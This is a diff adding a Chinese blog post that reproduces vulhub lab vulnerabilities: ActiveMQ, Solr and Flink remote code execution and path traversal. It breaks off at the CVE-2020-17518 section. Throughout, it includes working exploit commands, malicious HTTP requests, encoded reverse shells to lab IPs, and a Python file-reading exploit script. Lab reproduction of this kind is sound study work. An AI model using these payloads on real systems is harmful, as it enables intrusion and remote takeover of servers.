@@ -1934,4 +1934,482 @@
 <img src="/2023/08/06/DC5-6%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-6%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png" class>
 ]]></content>
   </entry>
+  <entry>
+    <title>vulhub复现</title>
+    <url>/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="vulhub复现记录"><a href="#vulhub复现记录" class="headerlink" title="vulhub复现记录"></a>vulhub复现记录</h1><p>借鉴大佬的博客：<a href="https://drinkflower.asia/">drinkflower的主页</a></p>
+<h2 id="CVE-2015-5254（ActiveMQ的反序列化与rce）"><a href="#CVE-2015-5254（ActiveMQ的反序列化与rce）" class="headerlink" title="CVE-2015-5254（ActiveMQ的反序列化与rce）"></a>CVE-2015-5254（ActiveMQ的反序列化与rce）</h2><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>关于ActiveMQ</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ActiveMQ是一个由Apache软件基金会开发的一个开放源代码的纯Java程序式的消息中间件，消息的发送和接收是异步的，在合适的时候发送给接收者</span><br><span class="line"></span><br><span class="line">JMS是java消息服务的应用程序接口，是一个java平台关于面向消息中间件的API，用于进行异步通信。对于端口61616，这是ActiveMQ提供给Java应用程序使用的端口，java应用程序可以使用JMS API连接到ActiveMQ服务器</span><br><span class="line"></span><br><span class="line">端口8161是ActiveMQ的面板控制管理平台，在浏览器访问这个端口，可以查看和管理ActiveMQ的配置、消息接收等等</span><br><span class="line"></span><br><span class="line">ysoserial是一款用于生成利用不安全的Java对象反序列化的有效负载的概念验证工具</span><br><span class="line"></span><br><span class="line">jmet是一个java写的工具，原理是使用ysoserial生成Payload并发送（其jar包内自带ysoserial，无需自己下载），下载地址为https://github.com/matthiaskaiser/jmet</span><br></pre></td></tr></table></figure>
+
+<p>而本漏洞原理就是远程攻击者可借助特制的序列化Java Message Service的ObjectMessage对象利用该漏洞执行任意代码</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>下载jmet的jar包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>在jmet的jar包的保存目录下执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q myevent -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME 127.0.0.1（你的目标机的ｉｐ） 61616</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>上面命令只是向ActiveMQ发送了一个带有恶意的消息，但是并没有被执行，但是因为我们是以管理员登录的，所以直接点击就行，现实情况下应该是需要诱导管理员进行点击的</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A34.png" class>
+
+<p>使用docker exec命令来连接docker的shell,看一下tmp目录有没有sucess文件(-i后面接docker ps查看到的容器id,&#x2F;bin&#x2F;bash是指定终端程序)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps </span><br><span class="line">docker exec -i 9b7e4934b7f1 /bin/bash </span><br><span class="line">ls /tmp/</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A35.png" class>
+
+<p>确实有success文件，说明是存在rce的，应该也需要提权，这里就先监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
+
+<p>这里需要将命令进行base64编码，将base64编码并执行的语句为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,命令的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用在线网站编码反弹shell的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.101/8888 0&gt;&amp;1</span><br><span class="line">IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEwMS84ODg4IDA+JjE=</span><br></pre></td></tr></table></figure>
+
+<p>再在kali中使用jmet的rce进行反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,IGJhc2ggLWkgPiYgL2Rldi</span><br><span class="line">90Y3AvMTkyLjE2OC4xLjEwMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.10.129 61616</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A36.png" class>
+
+<p>这时候我们可以在管理面板发现有新消息，点击一下</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A37.png" class>
+
+<p>现在我们发现监听的端口就有了shell，并且直接是root权限</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/5254%E7%A0%B4%E8%A7%A38.png" class>
+
+<p>复现成功</p>
+<h2 id="CVE-2017-12629（Apache-Solr远程命令执行）"><a href="#CVE-2017-12629（Apache-Solr远程命令执行）" class="headerlink" title="CVE-2017-12629（Apache Solr远程命令执行）"></a>CVE-2017-12629（Apache Solr远程命令执行）</h2><img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/12629%E7%A0%B4%E8%A7%A3.png" class>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Solr 是基于 Apache Lucene 构建的一个开源的搜索平台，提供了全文搜索、分析、过滤、排序等功能。它扩展了 Apache Lucene 并提供了更丰富的功能，能够构建复杂的搜索应用程序。在 CVE-2017-12629 漏洞中，Apache Solr 是受影响的组件，由于漏洞的存在，可能导致远程代码执行。</span><br><span class="line"></span><br><span class="line">Lucene 是一个高效的，基于 Java 的全文检索库。 Lucene 是 apache 软件基金会 4 jakarta 项目组的一个子项目，是一个开放源代码的全 文检索引擎工具包，但它不是一个完整的全文检索引擎，而是一个全文检索引擎的架构，Lucene主要提供了一个简单、强大的应用程序接口。在cve-2017-12629漏洞中，Apache Luence是Apache Solr的核心组件之一，用于实现索引和搜索功能</span><br><span class="line"></span><br><span class="line">漏洞利用条件为Apache Solr&lt;7.1，Apache Lucene&lt;7.1</span><br></pre></td></tr></table></figure>
+
+<p>从面板中我们可以得知Apache Solr和Apache Luence两个组件的版本均符合要求</p>
+<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>在Apache Solr中，能够触发命令执行的方式有两种，分别是postCommit和newSearcher</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 Apache Solr 中，postCommit 和 newSearcher 是与索引操作和搜索操作相关的事件触发器。它们可以用于在索引提交</span><br><span class="line">和搜索查询时执行自定义的操作，包括命令执行，从而可能导致安全漏洞。</span><br><span class="line"></span><br><span class="line">postCommit：postCommit 是一个在索引提交后触发的事件，也就是在索引更新或新增操作完成之后执行的操作。这个事件可</span><br><span class="line">以用于执行一些需要在索引更新后立即处理的任务，比如通知其他系统更新、生成缓存等。然而，如果在 postCommit 中执行</span><br><span class="line">不当操作，如执行恶意命令，就可能导致安全风险。</span><br><span class="line"></span><br><span class="line">newSearcher：newSearcher 是一个在每次 Solr 实例中的搜索器（Searcher）被创建或重新加载时触发的事件。搜索器是</span><br><span class="line">用于执行搜索查询的组件。newSearcher 事件可以用于执行一些在搜索开始之前或之后需要处理的操作，比如更新一些数据、</span><br><span class="line">记录日志等。同样地，如果在 newSearcher 中执行恶意操作，就可能导致安全问题。</span><br><span class="line"></span><br><span class="line">在 CVE-2017-12629 漏洞中，攻击者能够利用 Solr 中的这些事件触发器来执行恶意的远程代码，从而实现命令执行。这是</span><br><span class="line">由于 Solr 没有充分限制对于这些事件触发器的访问权限，导致攻击者可以构造恶意请求来触发这些事件并执行恶意代码，从</span><br><span class="line">而影响服务器的安全性。为了防止这类风险，Solr 的管理员需要进行适当的配置和限制，确保只有受信任的操作可以触发这些</span><br><span class="line">事件。</span><br></pre></td></tr></table></figure>
+
+<p>通过newSearcher进行命令执行的话，一个数据包即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8983</span><br><span class="line">Content-Length: 170</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;newSearcher&quot;,&quot;name&quot;:&quot;newSearcher3&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,</span><br><span class="line">&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/miao&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>对于上面这个数据包有一点需要注意的是后面一部分里的name是可以随便取的，并且可重复发包，但是这个name不能重复，一旦重复就会发生报错</strong></p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/12629%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>最后一部分就是我们想要执行的命令，这里我们连接容器的shell进去看看文件是否创建成功，也就是命令是否被成功执行了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -i 6545c241717e /bin/bash</span><br><span class="line">ls /tmp/</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/12629%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>可以看到我们创建成功了，也就是说命令成功执行，那我们下一步就执行反弹shell，先在kali上监听4441端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4441</span><br></pre></td></tr></table></figure>
+
+<p>然后发包(记得改name)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.10.129:8983</span><br><span class="line">Content-Length: 170</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;newSearcher&quot;,&quot;name&quot;:&quot;newSearcher5&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,</span><br><span class="line">&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.10.129/4441 0&gt;&amp;1&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/12629%E7%A0%B4%E8%A7%A34.png" class>
+
+<p>这里可以看到数据包上传成功了，但是在我们所监听的端口没有得到回应，试了好几次都失败了，不管了，万一本身就不能弹shell呢，反正证明了这个rce确实是存在的。</p>
+<h2 id="CVE-2019-0193（Apache-solr远程命令执行）"><a href="#CVE-2019-0193（Apache-solr远程命令执行）" class="headerlink" title="CVE-2019-0193（Apache solr远程命令执行）"></a>CVE-2019-0193（Apache solr远程命令执行）</h2><p>本次的cve针对的还是solr，和上面的服务是一样的，这里就不再介绍一遍了</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0193%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>我们可以看到，版本升级为了8.1.1，这样子就不符合上一个漏洞的条件了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此漏洞存在于可选模块DataImportHandler中，DataImportHandler是用于从数据库或其他源提取数据的常用模块，该模块中所有DIH配置都可以通过外部请求的dataConfig参数来设置，由于DIH配置可以包含脚本，因此该参数存在安全隐患。攻击者可利用dataConfig参数构造恶意请求，实现远程代码执行。</span><br><span class="line"></span><br><span class="line">漏洞利用条件：Apache solr&lt;8.2.0</span><br></pre></td></tr></table></figure>
+
+<p>根据上面对面板的截图，可以看到这个版本是符合漏洞利用条件的。</p>
+<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>这里对于复现的第一步做一个解释，CVE-2019-0193和上面的CVE-2017-12629不一样的是此环境没有自带的core，那什么是core呢</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 Apache Solr 中，&quot;core&quot; 是一个重要的概念，它表示了 Solr 实例中的一个独立的、可搜索的索引。每个 Solr 实例可</span><br><span class="line">以包含一个或多个核心（core）。每个核心都代表一个单独的索引，它可以包含特定的数据集、配置和模式。核心使得 Solr</span><br><span class="line">能够同时管理和服务多个独立的搜索需求。</span><br><span class="line"></span><br><span class="line">每个核心都有自己的配置文件、模式定义、数据目录等。不同的核心可以具有不同的配置，从而允许您为不同的数据集和搜索</span><br><span class="line">需求进行不同的设置。</span><br><span class="line"></span><br><span class="line">通过核心的概念，Solr 能够有效地管理和分配系统资源，实现多租户的搜索环境。每个核心可以独立地执行索引、查询和维护</span><br><span class="line">操作，从而提高了系统的灵活性和性能。</span><br><span class="line"></span><br><span class="line">在 Solr 的配置中，您可以通过配置文件（例如 solr.xml）来定义和管理核心。您可以在 Solr 的管理界面中创建、删除、</span><br><span class="line">重载和管理核心，以满足不同的搜索需求。核心是 Solr 集群中的一个基本单元，可以帮助您更好地组织和管理索引和搜索功</span><br><span class="line">能。</span><br></pre></td></tr></table></figure>
+
+<p>所以第一步我们需要创建一个core</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -i 4f80f15c3abe /bin/bash</span><br><span class="line">bin/solr create_core -c liberator -d example/example-DIH/solr/db</span><br></pre></td></tr></table></figure>
+
+<p>先连上镜像内部的shell，后面这一步就创建了一个名为liberator的core</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0193%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>我们将Configuration里面的内容全部替换为我们自己的poc（由exec命令在&#x2F;tmp目录下创建一个success文件）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name=&quot;stackoverflow&quot;</span><br><span class="line">            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span><br><span class="line">            processor=&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach=&quot;/feed&quot;</span><br><span class="line">            transformer=&quot;script:poc&quot; /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>
+
+<p>点击Execute with the configuration之后，再由我们连接的镜像内部的shell来看看是否创建成功</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/0193%E7%A0%B4%E8%A7%A33.png" class>
+
+<p>可以看到已经创建成功了。</p>
+<p>当然我们也可以利用这个漏洞尝试进行反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;/bin/bash &gt;&amp; /dev/tcp/192.168.10.129 4441 0&gt;&amp;1&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name=&quot;stackoverflow&quot;</span><br><span class="line">            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;</span><br><span class="line">            processor=&quot;XPathEntityProcessor&quot;</span><br><span class="line">            forEach=&quot;/feed&quot;</span><br><span class="line">            transformer=&quot;script:poc&quot; /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不知道为啥反弹shell又失败了，但是可以RCE对于漏洞的复现已经完成了</p>
+<h2 id="CVE-2020-17519（Apache-Flink目录遍历漏洞）"><a href="#CVE-2020-17519（Apache-Flink目录遍历漏洞）" class="headerlink" title="CVE-2020-17519（Apache Flink目录遍历漏洞）"></a>CVE-2020-17519（Apache Flink目录遍历漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Flink 是一个分布式系统，它需要计算资源来执行应用程序。Flink 集成了所有常见的集群资源管理器，例如 Hadoop YARN、 Apache Mesos和Kubernetes，但同时也可以作为独立集群运行。 </span><br><span class="line"></span><br><span class="line">Flink 被设计为能够很好地工作在上述每个资源管理器中，这是通过资源管理器特定(resource-manager-specific)的部署 模式实现的。Flink 可以采用与当前资源管理器相适应的方式进行交互。  </span><br><span class="line"></span><br><span class="line">部署 Flink 应用程序时，Flink 会根据应用程序配置的并行性自动标识所需的资源，并从资源管理器请求这些资源。在发生 故障的情况下，Flink 通过请求新资源来替换发生故障的容器。提交或控制应用程序的所有通信都是通过 REST 调用进行的 ，这可以简化 Flink 与各种环境中的集成。 </span><br><span class="line"></span><br><span class="line">Apache Flink 1.11.0 中引入的一项更改（也在 1.11.1 和 1.11.2 中发布）允许攻击者通过 JobManager 进程的 REST 接口读取 JobManager 本地文件系统上的任何文件。 远程攻击者通过REST API目录遍历，可造成文件读取/写入的影响。 在 Apache Flink 中，JobManager 是 Flink 集群中的一个主要组件，负责调度和协调作业的执行。而 REST 接口是一种通 过 HTTP 协议暴露的接口，用于与 Flink 集群进行交互和管理。 </span><br><span class="line"></span><br><span class="line">JobManager： JobManager 是 Flink 集群的主要控制节点，负责接收作业提交请求、调度任务、分配资源、协调任务执行等。每个 Flink 集群都有一个 JobManager。使用 Flink 的命令行工具或者编程方式与 JobManager 进行交互。命令行工具如flink run可以用来提交作业，而编程方式可以使用 Flink 的客户端 API。 </span><br><span class="line"></span><br><span class="line">REST 接口： Flink 提供了 REST 接口，允许用户和外部系统通过 HTTP 请求与 Flink 集群进行交互。通过 REST 接口，您可以提交作业、查询作业状态、查看集群状态、管理任务等。Flink 的 REST 接口默认在端口 8081 上运行（可以通过配置进行修改）。您可以使用任何支持 HTTP 请求的工具，如 cURL、Postman 或编程语言中的 HTTP 请求库，向 REST 接口发送请求来查询作业状态、查看集群状态等。 简单来说,rest接口在8081端口对外提供api,利用它提供的api可以实现任意文件读取 </span><br><span class="line"></span><br><span class="line">漏洞利用条件为Apache Flink版本为1.11.0或者1.11.1或者1.11.2</span><br></pre></td></tr></table></figure>
+
+<p>访问8081端口，看到如下面板，可以看到版本为1.11.2，是符合漏洞利用条件的</p>
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17519%E7%A0%B4%E8%A7%A3.png" class>
+
+<p>Apache Flink 的 6123 端口用于 Flink 的远程通信和管理，主要用于与 Flink 集群中的 JobManager 通信。 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JobManager 是 Flink 集群的主要协调节点，负责接收和调度提交的作业（jobs），管理任务的调度和执行，并提供了 REST 接口供用户和外部系统与 Flink 集群进行交互。  通过 6123 端口，您可以使用 Flink 的 REST API 与 Flink 集群进行交互，例如提交作业、查询作业状态、获取作业详情 等操作。这是与 Flink 集群进行远程管理和监控的入口之一。</span><br></pre></td></tr></table></figure>
+
+<p>关于8081端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8081 端口用于 Flink 的 Web UI 界面和 REST 接口。Flink 的 Web UI 提供了一个用户界面，允许您监控和管理正在执行 的作业、任务、JobManager 和 TaskManager 的状态等。此外，8081 端口还提供了 Flink 的 REST API，允许您通过  HTTP 请求与 Flink 集群进行交互，例如提交作业、查询作业状态、获取作业计数等。</span><br></pre></td></tr></table></figure>
+
+<p>6123 端口用于 Flink 内部组件之间的通信，而 8081 端口用于提供用户界面和与 Flink 集群进行交互的 REST 接 口。所以我们打的是8081端口(也可能被改成其他的了,反正是提供ui的那个端口)</p>
+<p>直接使用poc的生成进行目录穿越</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.10.129:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/17/vulhub%E5%A4%8D%E7%8E%B0/17519%E7%A0%B4%E8%A7%A32.png" class>
+
+<p>可以看到读取成功，复现完成</p>
+<p>这里附上相关脚本，因为实战不一定需要穿越这么多层目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: Apache Flink   1.11.0-1.11.2                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式: python3 CVE-2020-17519.py                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:xxx                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mFile        &gt;&gt;&gt; /etc/passwd                                        \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url, file_name):</span><br><span class="line">    file_name = file_name.replace(&quot;/&quot;, &quot;%252f&quot;)</span><br><span class="line">    vuln_url = target_url + &quot;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..&#123;&#125;&quot;.format(file_name)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers)</span><br><span class="line">        print(&quot;\033[32m[o] 请求URL ： &#123;&#125;\033[0m&quot;.format(vuln_url))</span><br><span class="line">        if &quot;root&quot; in response.text:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125; 存在漏洞,成功读取 /etc/passwd ，响应为:\n&#123;&#125;\033[0m&quot;.format(target_url, response.text))</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">def POC_2(target_url, file_name):</span><br><span class="line">    file_name_re = file_name.replace(&quot;/&quot;, &quot;%252f&quot;)</span><br><span class="line">    vuln_url = target_url + &quot;/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..&#123;&#125;&quot;.format(file_name_re)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url=vuln_url, timeout=10, verify=False, headers=headers)</span><br><span class="line">        print(&quot;\033[32m[o] 请求URL ： &#123;&#125;\033[0m&quot;.format(vuln_url))</span><br><span class="line">        if &quot;error&quot; not in response.text:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125; 存在漏洞,成功读取 &#123;&#125; ，响应为:\n&#123;&#125;\033[0m&quot;.format(target_url, file_name, response.text))</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;\033[31m[x] 目标文件&#123;&#125;读取失败\033[0m&quot;.format(file_name))</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl   &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    file_name = &quot;/etc/passwd&quot;</span><br><span class="line">    POC_1(target_url, file_name)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        file_name = input(&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;)</span><br><span class="line">        if file_name == &quot;exit&quot;:</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        else:</span><br><span class="line">            POC_2(target_url, file_name)</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本会先拿&#x2F;etc&#x2F;passwd测试是否读取成功来判断是否存在漏洞,如果存在就可以直接读取了,这里贴一份linux都有的文件,并且不需要root直接就能读的,因为这个漏洞读文件是没有root的,感觉比较鸡肋,得配合别的漏洞才能打</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd: 包含有关系统用户的信息。</span><br><span class="line">/etc/group: 包含有关用户组的信息。</span><br><span class="line">/etc/hostname: 包含主机名信息。</span><br><span class="line">/etc/issue: 包含系统登录提示信息。</span><br><span class="line">/etc/motd: 包含登录后的消息（Message of the Day）。</span><br><span class="line">/etc/resolv.conf: 包含 DNS 解析配置信息。</span><br><span class="line">/etc/fstab: 包含文件系统挂载信息。</span><br><span class="line">/etc/hosts: 包含主机名与 IP 地址的映射。</span><br><span class="line">/etc/issue.net: 包含在网络上显示的信息。</span><br><span class="line">/etc/localtime: 包含系统的时区信息。</span><br><span class="line">/usr/share/zoneinfo: 包含各个时区的文件。</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2020-17518（Apache-flink远程代码执行漏洞）"><a href="#CVE-2020-17518（Apache-flink远程代码执行漏洞）" class="headerlink" title="CVE-2020-17518（Apache flink远程代码执行漏洞）"></a>CVE-2020-17518（Apache flink远程代码执行漏洞）</h2><p>由于CVE-2020-17519也是关于介绍Apache flink的，所以就不再进行叙述了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flink在1.5.1版本中引入了一个REST handler，这允许攻击者将已上传的文件写入到本地任意文件中，并且可通过一个恶意修改的HTTP头将这些文件写入到Flink 1.5.1可以访问的任何位置</span><br><span class="line"></span><br><span class="line">在1.5.1版本中引入的REST handler是用于通过REST API执行特定的操作，通过REST handler，可以使用HTTP请求来与Flink集群进行交互没执行各种操作，例如提交作业等等。</span><br></pre></td></tr></table></figure>
+
+<p>如果要使用REST handler，需要执行以下步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在Flink 配置文件中，您需要启用REST接口，找到以下配置项并设置为true:</span><br><span class="line">rest.port:8081</span><br><span class="line">rest.bind-address:localhost</span><br><span class="line"></span><br><span class="line">这将启用Flink的REST接口，并将其绑定到本地主机的8081端口</span><br></pre></td></tr></table></figure>
+
+<p>一旦启用了REST接口，可以使用任何HTTP请求的工具（例如curl、Postman、浏览器等），来与Flink集群进行交互，例如，要提交一个作业，可以使用POST请求来提交作业的JAR文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;Expect:&quot; -F &quot;jarfile=@/path/to/your/job.jar&quot; http://localhost:8081/jars/upload</span><br></pre></td></tr></table></figure>
+
+<p>要查询作业，可以使用get请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://localhost:8081/jobs</span><br></pre></td></tr></table></figure>
+
+<p>在 Apache Flink 中，一个”作业”（Job）是指一个由一个或多个数据流转换操作组成的数据处理流程。这个流程通常是用户编写的代码，用于在分布式环境中执行数据处理任务。作业描述了数据的输入、转换操作以及输出。它包含了以下部分 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据源（Source）：作业通常从一个或多个数据源获取输入数据。数据源可以是文件、消息队列、套接字等。 </span><br><span class="line"></span><br><span class="line">转换操作（Transformation）：这些操作对输入数据进行处理，可以是诸如映射、过滤、分组、聚合等操作。  </span><br><span class="line"></span><br><span class="line">数据汇（Sink）：作业将处理后的数据发送到一个或多个数据汇，数据汇可以是文件、数据库、消息队列等。  </span><br><span class="line"></span><br><span class="line">并行度（Parallelism）：作业可以在集群的多个计算节点上并行执行，通过指定并行度，您可以控制作业的分布式执行方式。  </span><br><span class="line"></span><br><span class="line">检查点（Checkpointing）：Flink 支持状态检查点，以便在发生故障时恢复作业状态。</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用条件</p>
